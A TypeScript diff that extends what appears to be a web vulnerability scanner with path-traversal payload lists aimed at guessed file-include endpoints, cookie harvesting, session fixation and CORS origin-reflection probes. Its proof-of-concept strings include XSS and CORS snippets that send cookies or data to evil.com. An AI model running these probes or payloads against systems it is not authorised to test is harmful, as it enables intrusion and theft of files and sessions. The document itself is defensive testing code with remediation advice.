@@ -26,9 +26,13 @@ const SCAN_HANDLERS: Record<string, (target: string, options?: any) => Promise<S
   
   // Web scans
   'directory': performDirectoryEnum,
+  'dir-traversal': performDirectoryEnum,       // alias — path traversal focused
+  'path-traversal': performDirectoryEnum,      // alias
   'crawl': performWebCrawl,
   'headers': performHeaderAnalysis,
   'cookies': performCookieAnalysis,
+  'cookie-hijack': performCookieAnalysis,      // alias — session hijacking focused
+  'session': performCookieAnalysis,            // alias
   'forms': performFormAnalysis,
   'links': performLinkExtraction,
   
@@ -47,6 +51,8 @@ const SCAN_HANDLERS: Record<string, (target: string, options?: any) => Promise<S
   'rate-limit': performRateLimitTest,
   'jwt-test': performJWTAnalysis,
   'cors-test': performCORSTest,
+  'cors': performCORSTest,                     // alias
+  'cors-advanced': performCORSTest,            // alias — full CORS exploitation
   
   // Cloud Security
   's3-enum': performS3Enumeration,
@@ -495,33 +501,149 @@ async function performBannerGrab(target: string): Promise<ScanResult> {
 
 // Web Scanning Functions
 async function performDirectoryEnum(target: string): Promise<ScanResult> {
-  const dirs = ['/admin', '/backup', '/config', '/uploads', '/api', '/.git', '/wp-admin', '/phpmyadmin'];
-  const found: string[] = [];
-  let output = `Directory Enumeration for ${target}\n${'═'.repeat(50)}\n\n`;
+  const url = target.startsWith('http') ? target : `http://${target}`;
+  const findings: Finding[] = [];
+  let output = `Directory & Path Traversal Scan for ${target}\n${'═'.repeat(50)}\n\n`;
 
-  for (const dir of dirs) {
+  // Phase 1: Common sensitive directory discovery
+  const sensitiveDirs = [
+    { path: '/admin', severity: 'high' as const },
+    { path: '/administrator', severity: 'high' as const },
+    { path: '/backup', severity: 'critical' as const },
+    { path: '/backup.zip', severity: 'critical' as const },
+    { path: '/backup.tar.gz', severity: 'critical' as const },
+    { path: '/db_backup.sql', severity: 'critical' as const },
+    { path: '/.git/HEAD', severity: 'critical' as const },
+    { path: '/.git/config', severity: 'critical' as const },
+    { path: '/.env', severity: 'critical' as const },
+    { path: '/.env.local', severity: 'critical' as const },
+    { path: '/.env.production', severity: 'critical' as const },
+    { path: '/config', severity: 'high' as const },
+    { path: '/config.php', severity: 'high' as const },
+    { path: '/wp-config.php', severity: 'critical' as const },
+    { path: '/web.config', severity: 'high' as const },
+    { path: '/uploads', severity: 'medium' as const },
+    { path: '/api', severity: 'medium' as const },
+    { path: '/api/v1', severity: 'medium' as const },
+    { path: '/api/v2', severity: 'medium' as const },
+    { path: '/phpmyadmin', severity: 'critical' as const },
+    { path: '/wp-admin', severity: 'high' as const },
+    { path: '/wp-login.php', severity: 'high' as const },
+    { path: '/server-status', severity: 'high' as const },
+    { path: '/server-info', severity: 'high' as const },
+    { path: '/.htaccess', severity: 'high' as const },
+    { path: '/robots.txt', severity: 'info' as const },
+    { path: '/sitemap.xml', severity: 'info' as const },
+    { path: '/swagger.json', severity: 'medium' as const },
+    { path: '/openapi.json', severity: 'medium' as const },
+    { path: '/graphql', severity: 'medium' as const },
+    { path: '/debug', severity: 'high' as const },
+    { path: '/console', severity: 'high' as const },
+    { path: '/actuator', severity: 'high' as const },
+    { path: '/actuator/health', severity: 'medium' as const },
+    { path: '/actuator/env', severity: 'critical' as const },
+    { path: '/phpinfo.php', severity: 'high' as const },
+    { path: '/info.php', severity: 'high' as const },
+    { path: '/test.php', severity: 'medium' as const },
+    { path: '/shell.php', severity: 'critical' as const },
+    { path: '/cmd.php', severity: 'critical' as const },
+  ];
+
+  output += `[Phase 1] Sensitive Directory & File Discovery...\n`;
+  for (const { path, severity } of sensitiveDirs) {
     try {
-      const url = target.startsWith('http') ? target : `https://${target}`;
-      const response = await fetchWithTimeout(`${url}${dir}`, { method: 'HEAD' });
-      if (response.status !== 404) {
-        found.push(dir);
-        output += `[+] ${dir} - Status: ${response.status}\n`;
+      const resp = await fetchWithTimeout(`${url}${path}`, {
+        method: 'GET',
+        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+      }, 4000);
+      if (resp.status !== 404 && resp.status !== 403) {
+        const body = await resp.text();
+        output += `[+] ${path} → HTTP ${resp.status} (${body.length} bytes)\n`;
+        // Check for sensitive content in response
+        const isSensitive = body.includes('DB_PASSWORD') || body.includes('SECRET_KEY') ||
+          body.includes('root:') || body.includes('ref: refs/heads') ||
+          path.endsWith('.sql') || path.endsWith('.zip');
+        findings.push({
+          name: `Exposed Path: ${path}`,
+          severity: isSensitive ? 'critical' : severity,
+          description: `HTTP ${resp.status} response on ${path} — ${isSensitive ? '⚠️ Sensitive data detected in response!' : 'Path accessible'}`,
+          poc: `curl -i ${url}${path}\nHTTP ${resp.status} — ${body.length} bytes\n${isSensitive ? 'Body contains sensitive data keywords.' : ''}`,
+          remediation: `Restrict access to ${path} via server config. Remove from production. Check for sensitive data exposure.`,
+        });
+      } else {
+        output += `[-] ${path} → ${resp.status}\n`;
       }
-    } catch {
-      // Not found
+    } catch { /* timeout/unreachable */ }
+  }
+
+  // Phase 2: Path traversal attack payloads
+  output += `\n[Phase 2] Active Path Traversal Attack...\n`;
+  const traversalPayloads = [
+    '../../../etc/passwd',
+    '..%2f..%2f..%2fetc%2fpasswd',
+    '..%252f..%252f..%252fetc%252fpasswd', // double URL-encoded
+    '....//....//....//etc/passwd',          // filter bypass (dots+slash)
+    '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+    '..%c0%af..%c0%af..%c0%afetc/passwd',   // UTF-8 overlong encoding
+    '/etc/passwd',
+    'file:///etc/passwd',
+    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+    '../../../windows/win.ini',
+    '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini',
+    '../../../proc/self/environ',
+    '../../../var/log/apache2/access.log',
+    '../../../var/www/html/wp-config.php',
+  ];
+
+  const traversalEndpoints = [
+    '/index.php?page=INJECT',
+    '/index.php?file=INJECT',
+    '/index.php?include=INJECT',
+    '/view.php?file=INJECT',
+    '/download.php?f=INJECT',
+    '/download.php?path=INJECT',
+    '/read.php?file=INJECT',
+    '/load.php?template=INJECT',
+    '/show.php?doc=INJECT',
+    '/fetch?url=INJECT',
+  ];
+
+  for (const endpoint of traversalEndpoints) {
+    for (const payload of traversalPayloads) {
+      try {
+        const testUrl = `${url}${endpoint.replace('INJECT', encodeURIComponent(payload))}`;
+        const resp = await fetchWithTimeout(testUrl, {
+          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' },
+        }, 5000);
+        const body = await resp.text();
+
+        // Detect successful traversal by content signatures
+        const isLinuxPasswd = body.includes('root:') && (body.includes('/bin/bash') || body.includes('/bin/sh'));
+        const isWinHosts   = body.includes('localhost') && body.includes('127.0.0.1') && body.includes('# Copyright');
+        const isWinIni     = body.includes('[fonts]') || body.includes('[extensions]');
+        const isEnvFile    = body.includes('DB_PASSWORD=') || body.includes('SECRET_KEY=') || body.includes('API_KEY=');
+        const isSelfEnviron = body.includes('APACHE_RUN_USER') || body.includes('DOCUMENT_ROOT=');
+
+        if (isLinuxPasswd || isWinHosts || isWinIni || isEnvFile || isSelfEnviron) {
+          const evidenceType = isLinuxPasswd ? '/etc/passwd exposed' : isWinHosts ? 'Windows hosts exposed' :
+            isWinIni ? 'Windows win.ini exposed' : isEnvFile ? '.env file exposed' : '/proc/self/environ exposed';
+          output += `[CRITICAL] Path Traversal — ${evidenceType}\n  URL: ${testUrl}\n  Payload: ${payload}\n\n`;
+          findings.push({
+            name: `Path Traversal: ${evidenceType}`,
+            severity: 'critical',
+            description: `Successful path traversal — server returned ${evidenceType} via payload injection`,
+            poc: `GET ${testUrl}\n\nEvidence (first 300 chars):\n${body.slice(0, 300)}`,
+            remediation: 'Sanitize all file path inputs. Use basename(). Whitelist allowed directories. Chroot or jail file operations. Disable include/require with user-supplied input.',
+          });
+        } else {
+          output += `[SAFE] ${endpoint.split('?')[0]} + ${payload.slice(0, 30)}...\n`;
+        }
+      } catch { /* continue */ }
     }
   }
 
-  output += `\nDirectories found: ${found.length}`;
-
-  return {
-    output,
-    findings: found.map(d => ({
-      name: `Directory: ${d}`,
-      severity: d.includes('admin') || d.includes('backup') || d.includes('.git') ? 'high' : 'medium',
-      description: `Accessible directory found: ${d}`
-    }))
-  };
+  output += `\n${'─'.repeat(40)}\nPath Traversal Scan Complete: ${findings.length} issue(s) found.`;
+  return { output, findings };
 }
 
 async function performWebCrawl(target: string): Promise<ScanResult> {
@@ -575,32 +697,137 @@ async function performHeaderAnalysis(target: string): Promise<ScanResult> {
 
 async function performCookieAnalysis(target: string): Promise<ScanResult> {
   const findings: Finding[] = [];
-  let output = `Cookie Security Analysis for ${target}\n${'═'.repeat(50)}\n\n`;
+  let output = `Cookie Hijacking & Security Analysis for ${target}\n${'═'.repeat(50)}\n\n`;
+  const url = target.startsWith('http') ? target : `https://${target}`;
+  const httpUrl  = `http://${url.replace(/^https?:\/\//, '')}`;
+  const domain   = url.replace(/^https?:\/\//, '').split('/')[0];
 
-  try {
-    const url = target.startsWith('http') ? target : `https://${target}`;
-    const response = await fetchWithTimeout(url);
-    const cookies = response.headers.get('set-cookie');
+  // Phase 1: Harvest all cookies from multiple endpoints
+  const harvestEndpoints = ['/', '/login', '/api', '/user', '/account', '/dashboard'];
+  const allCookieStrings: string[] = [];
 
-    if (cookies) {
-      output += `Cookies found:\n${cookies}\n\n`;
-      
-      if (!cookies.includes('Secure')) {
-        findings.push({ name: 'Cookie Missing Secure Flag', severity: 'medium', description: 'Cookies should have Secure flag' });
+  output += `[Phase 1] Cookie Harvesting from key endpoints...\n`;
+  for (const ep of harvestEndpoints) {
+    try {
+      const resp = await fetchWithTimeout(`${url}${ep}`, {
+        redirect: 'follow',
+        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+      }, 5000);
+      const setCookie = resp.headers.get('set-cookie');
+      if (setCookie) {
+        allCookieStrings.push(setCookie);
+        output += `  ${ep} → Set-Cookie: ${setCookie.slice(0, 120)}...\n`;
+      } else {
+        output += `  ${ep} → No cookies set\n`;
       }
-      if (!cookies.includes('HttpOnly')) {
-        findings.push({ name: 'Cookie Missing HttpOnly Flag', severity: 'medium', description: 'Cookies should have HttpOnly flag' });
-      }
-      if (!cookies.includes('SameSite')) {
-        findings.push({ name: 'Cookie Missing SameSite', severity: 'low', description: 'Cookies should have SameSite attribute' });
-      }
-    } else {
-      output += 'No cookies set by server';
-    }
-  } catch (e) {
-    output += `Error: ${e.message}`;
+    } catch { /* skip */ }
   }
 
+  // Phase 2: Parse and audit each cookie for hijacking vectors
+  output += `\n[Phase 2] Cookie Attribute Security Audit...\n`;
+  const parseCookies = (raw: string) => raw.split(/,(?=[^ ])/).map(c => c.trim());
+
+  for (const rawCookie of allCookieStrings) {
+    const cookies = parseCookies(rawCookie);
+    for (const cookie of cookies) {
+      const name = cookie.split('=')[0]?.trim() || 'unknown';
+      const lower = cookie.toLowerCase();
+
+      const hasSecure   = lower.includes('secure');
+      const hasHttpOnly = lower.includes('httponly');
+      const hasSameSite = lower.includes('samesite');
+      const sameSiteVal = lower.match(/samesite=(\w+)/)?.[1] || 'not set';
+      const hasExpiry   = lower.includes('expires') || lower.includes('max-age');
+      const isSession   = name.toLowerCase().includes('sess') || name.toLowerCase().includes('auth') || name.toLowerCase().includes('token') || name.toLowerCase().includes('jwt');
+
+      output += `\n  Cookie: ${name}\n`;
+      output += `    Secure: ${hasSecure ? '✓' : '✗ MISSING'}\n`;
+      output += `    HttpOnly: ${hasHttpOnly ? '✓' : '✗ MISSING'}\n`;
+      output += `    SameSite: ${hasSameSite ? sameSiteVal : '✗ MISSING'}\n`;
+      output += `    Persistent: ${hasExpiry ? 'Yes' : 'Session-only'}\n`;
+
+      if (!hasSecure) {
+        findings.push({
+          name: `Cookie '${name}' Missing Secure Flag`,
+          severity: isSession ? 'high' : 'medium',
+          description: `Cookie transmitted over HTTP — susceptible to network interception and hijacking.`,
+          poc: `Cookie: ${name}\nMissing Secure flag → sent over HTTP → interceptable via MITM/ARP poisoning`,
+          remediation: 'Add Secure flag to all cookies. Enforce HTTPS site-wide via HSTS.',
+        });
+      }
+      if (!hasHttpOnly) {
+        findings.push({
+          name: `Cookie '${name}' Missing HttpOnly Flag`,
+          severity: isSession ? 'high' : 'medium',
+          description: `Cookie accessible via JavaScript — XSS can steal this cookie and hijack sessions.`,
+          poc: `Payload: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>\nCookie '${name}' would be exfiltrated.`,
+          remediation: 'Add HttpOnly flag to prevent JavaScript cookie access. Combine with Content-Security-Policy.',
+        });
+      }
+      if (!hasSameSite || sameSiteVal === 'none') {
+        findings.push({
+          name: `Cookie '${name}' Missing/Weak SameSite`,
+          severity: 'medium',
+          description: `SameSite=${sameSiteVal} — cookie sent with cross-site requests, enabling CSRF attacks.`,
+          poc: `<img src="${url}/api/delete-account?confirm=1"> → browser auto-attaches cookie '${name}'`,
+          remediation: 'Set SameSite=Strict or SameSite=Lax. Avoid SameSite=None unless required for cross-site embeds.',
+        });
+      }
+    }
+  }
+
+  // Phase 3: Test session fixation
+  output += `\n[Phase 3] Session Fixation Test...\n`;
+  try {
+    // Pre-set a known session ID and check if server accepts it
+    const fixedSessionId = 'FIXED_SESSION_12345';
+    const resp = await fetchWithTimeout(`${url}/login`, {
+      method: 'GET',
+      headers: {
+        'Cookie': `PHPSESSID=${fixedSessionId}; session=${fixedSessionId}`,
+        'User-Agent': 'Mozilla/5.0',
+      },
+    }, 5000);
+    const setCookie = resp.headers.get('set-cookie');
+    if (setCookie && (setCookie.includes(fixedSessionId) || resp.status === 200)) {
+      output += `  [POSSIBLE] Server may accept pre-set session IDs → Session Fixation risk\n`;
+      findings.push({
+        name: 'Possible Session Fixation',
+        severity: 'high',
+        description: 'Server appears to accept pre-set session IDs — attacker could fix victim\'s session and hijack after authentication.',
+        poc: `1. Attacker sends victim: ${url}/login with cookie PHPSESSID=FIXED_SESSION_12345\n2. Victim authenticates\n3. Attacker uses same session ID to access victim account`,
+        remediation: 'Regenerate session ID on every authentication event (login/logout). Invalidate old session on login.',
+      });
+    } else {
+      output += `  ✓ Server does not appear vulnerable to session fixation\n`;
+    }
+  } catch (e) {
+    output += `  [ERROR] ${e.message}\n`;
+  }
+
+  // Phase 4: HTTP cookie transmission test (downgrade)
+  output += `\n[Phase 4] HTTP Cookie Downgrade (MITM) Test...\n`;
+  try {
+    const httpResp = await fetchWithTimeout(httpUrl, {
+      redirect: 'manual',
+      headers: { 'User-Agent': 'Mozilla/5.0' },
+    }, 5000);
+    const httpCookie = httpResp.headers.get('set-cookie');
+    if (httpCookie && httpCookie.toLowerCase().includes('secure')) {
+      output += `  ✓ Secure cookies not sent over HTTP (redirect detected)\n`;
+    } else if (httpCookie) {
+      output += `  [HIGH] Cookies set over HTTP — downgrade attack possible!\n`;
+      findings.push({
+        name: 'Cookies Transmitted Over HTTP',
+        severity: 'high',
+        description: 'Server sets cookies on plain HTTP connections — susceptible to MITM interception and cookie hijacking.',
+        poc: `curl http://${domain}/ -I | grep -i set-cookie\n→ Cookies received over HTTP without SSL`,
+        remediation: 'Redirect all HTTP traffic to HTTPS (301). Add HSTS header. Ensure Secure flag on all cookies.',
+      });
+    }
+  } catch { /* https only site */ }
+
+  output += `\n${'─'.repeat(40)}\nCookie Hijacking Analysis Complete: ${findings.length} issue(s) found.`;
   return { output, findings };
 }
 
@@ -1038,23 +1265,130 @@ async function performJWTAnalysis(target: string): Promise<ScanResult> {
 async function performCORSTest(target: string): Promise<ScanResult> {
   let output = `CORS Misconfiguration Test for ${target}\n${'═'.repeat(50)}\n\n`;
   const findings: Finding[] = [];
+  const url = target.startsWith('http') ? target : `https://${target}`;
 
+  // Stage 1: Probe with a malicious origin to see if it's reflected/trusted
+  const maliciousOrigins = [
+    'https://evil.com',
+    'https://attacker.io',
+    `https://${url.replace(/^https?:\/\//, '').split('/')[0]}.evil.com`, // subdomain bypass
+    'null', // null origin bypass (sandboxed iframes)
+    `https://evil${url.replace(/^https?:\/\//, '').split('/')[0]}`, // prefix bypass
+  ];
+
+  output += `[Phase 1] Testing origin reflection attacks...\n`;
+  for (const origin of maliciousOrigins) {
+    try {
+      const resp = await fetchWithTimeout(url, {
+        method: 'GET',
+        headers: {
+          'Origin': origin,
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        },
+      }, 6000);
+      const acao = resp.headers.get('access-control-allow-origin');
+      const acac = resp.headers.get('access-control-allow-credentials');
+
+      output += `  Origin: ${origin}\n`;
+      output += `    Access-Control-Allow-Origin: ${acao || 'not set'}\n`;
+      output += `    Access-Control-Allow-Credentials: ${acac || 'not set'}\n`;
+
+      if (acao === origin && acac === 'true') {
+        findings.push({
+          name: 'Critical CORS Misconfiguration (Origin Reflection + Credentials)',
+          severity: 'critical',
+          description: `Server reflects arbitrary origin "${origin}" AND allows credentials — attacker can steal authenticated data cross-origin.`,
+          poc: `fetch("${url}", { credentials: "include" }).then(r=>r.json()).then(d=>fetch("https://evil.com/steal?d="+JSON.stringify(d)))\n[Sent Origin: ${origin}] [Got ACAO: ${acao}] [ACAC: ${acac}]`,
+          remediation: 'Validate Origin against a strict whitelist. Never use reflected origin with credentials=true. Prefer explicit origin lists.',
+        });
+        output += `    [CRITICAL] ⚠️ Origin reflected with credentials=true!\n`;
+      } else if (acao === origin) {
+        findings.push({
+          name: 'CORS Misconfiguration (Origin Reflection)',
+          severity: 'high',
+          description: `Server reflects attacker-controlled origin "${origin}" — cross-origin reads possible without credentials.`,
+          poc: `[Sent Origin: ${origin}] [Got ACAO: ${acao}]`,
+          remediation: 'Use a strict whitelist of trusted origins instead of reflecting the request Origin.',
+        });
+        output += `    [HIGH] ⚠️ Origin reflected!\n`;
+      } else if (acao === '*') {
+        findings.push({
+          name: 'Wildcard CORS Policy',
+          severity: 'medium',
+          description: 'CORS allows all origins (*) — any website can read non-credentialed responses.',
+          poc: `Access-Control-Allow-Origin: *`,
+          remediation: 'Restrict CORS to specific trusted origins. Do not use wildcard on authenticated endpoints.',
+        });
+        output += `    [MEDIUM] Wildcard CORS\n`;
+      } else {
+        output += `    [SAFE] Not reflected\n`;
+      }
+    } catch (e) {
+      output += `  [ERROR] ${origin}: ${e.message}\n`;
+    }
+  }
+
+  // Stage 2: Check preflight misconfig (OPTIONS)
+  output += `\n[Phase 2] Testing OPTIONS preflight misconfiguration...\n`;
   try {
-    const url = target.startsWith('http') ? target : `https://${target}`;
-    const response = await fetchWithTimeout(url);
-    const corsHeader = response.headers.get('access-control-allow-origin');
-    
-    output += `Access-Control-Allow-Origin: ${corsHeader || 'Not set'}\n`;
-    
-    if (corsHeader === '*') {
+    const preflightResp = await fetchWithTimeout(url, {
+      method: 'OPTIONS',
+      headers: {
+        'Origin': 'https://evil.com',
+        'Access-Control-Request-Method': 'PUT',
+        'Access-Control-Request-Headers': 'X-Custom-Header, Authorization',
+      },
+    }, 6000);
+    const acam = preflightResp.headers.get('access-control-allow-methods');
+    const acah = preflightResp.headers.get('access-control-allow-headers');
+    const acao = preflightResp.headers.get('access-control-allow-origin');
+    output += `  Allow-Methods: ${acam || 'not set'}\n`;
+    output += `  Allow-Headers: ${acah || 'not set'}\n`;
+    output += `  Allow-Origin: ${acao || 'not set'}\n`;
+
+    if (acam && acam.toLowerCase().includes('put') && acao === '*') {
       findings.push({
-        name: 'Wildcard CORS Policy',
-        severity: 'medium',
-        description: 'CORS allows requests from any origin'
+        name: 'Dangerous CORS Preflight: Wildcard + PUT Allowed',
+        severity: 'high',
+        description: 'Preflight allows PUT from any origin — potential for unauthorized state-changing requests.',
+        poc: `OPTIONS preflight: ACAO=*, ACAM includes PUT`,
+        remediation: 'Restrict allowed origins and methods. Never allow write methods (PUT/DELETE/PATCH) via wildcard CORS.',
       });
+      output += `  [HIGH] Dangerous preflight configuration!\n`;
     }
   } catch (e) {
-    output += `Error: ${e.message}`;
+    output += `  [ERROR] Preflight: ${e.message}\n`;
+  }
+
+  // Stage 3: Check sensitive endpoints for CORS
+  const sensitiveEndpoints = ['/api/user', '/api/account', '/api/me', '/api/profile', '/api/admin', '/api/config'];
+  output += `\n[Phase 3] Testing CORS on sensitive API endpoints...\n`;
+  for (const ep of sensitiveEndpoints) {
+    try {
+      const epUrl = `${url}${ep}`;
+      const resp = await fetchWithTimeout(epUrl, {
+        headers: { 'Origin': 'https://evil.com', 'User-Agent': 'Mozilla/5.0' },
+      }, 4000);
+      const acao = resp.headers.get('access-control-allow-origin');
+      if (acao === 'https://evil.com' || acao === '*') {
+        output += `  [FOUND] ${ep} → ACAO: ${acao}\n`;
+        findings.push({
+          name: `CORS on Sensitive Endpoint: ${ep}`,
+          severity: 'high',
+          description: `Endpoint ${ep} returns CORS header allowing cross-origin access to potentially sensitive data.`,
+          poc: `curl -H "Origin: https://evil.com" ${epUrl}\n→ Access-Control-Allow-Origin: ${acao}`,
+          remediation: 'Remove or restrict CORS on API endpoints that return user-specific data.',
+        });
+      } else {
+        output += `  [SAFE] ${ep}\n`;
+      }
+    } catch { /* skip unreachable endpoints */ }
+  }
+
+  if (findings.length === 0) {
+    output += `\n✓ No critical CORS misconfigurations detected.`;
+  } else {
+    output += `\n⚠️ ${findings.length} CORS issue(s) found!`;
   }
 
   return { output, findings };
